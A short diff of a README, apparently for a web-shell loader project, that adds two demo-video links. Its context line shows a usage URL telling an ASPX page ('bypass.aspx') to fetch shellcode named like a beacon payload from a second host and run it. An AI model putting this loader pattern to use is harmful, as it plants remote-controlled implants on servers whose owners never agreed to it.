@@ -21,3 +21,7 @@ http://URLA/bypass.aspx?shellcodeURL=http://URLB/beacon_x64.bin
 
 
 视频
+
+![](https://github.com/INotGreen/Webshell-loader/blob/main/video/demo.mp4)
+
+![演示视频](https://github.com/INotGreen/Webshell-loader/blob/main/video/demo.mp4)
